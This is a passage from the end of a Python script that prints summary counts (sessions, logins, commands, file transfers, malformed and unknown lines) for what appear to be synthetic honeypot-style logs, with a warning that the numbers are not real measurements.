            f"   sessions    {t['sessions']}\n"
            f"   events      {t['events_written']}\n"
            f"   logins      {t['login_attempts']} "
            f"({t['login_successes']} succeeded, "
            f"{t['publickey_attempts']} public-key)\n"
            f"   commands    {t['commands']} ({t['commands_failed']} "
            f"unimplemented)\n"
            f"   transfers   {t['downloads']} down "
            f"({t['downloads_without_url']} with no url), "
            f"{t['uploads']} up\n"
            f"   oddities    {t['late_events']} late, "
            f"{t['sessions_spanning_midnight']} span midnight\n"
            f"   unknown     {t['unmodelled_events']} real-but-unmodelled + "
            f"{t['unknown_event_lines']} invented ids\n"
            f"   malformed   {t['malformed_lines']} unparseable lines\n"
            "  ------------------------------------------------------------\n"
            "   No number from this data may be published as a measurement.\n"
            "  ============================================================\n",
            file=sys.stderr,
        )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
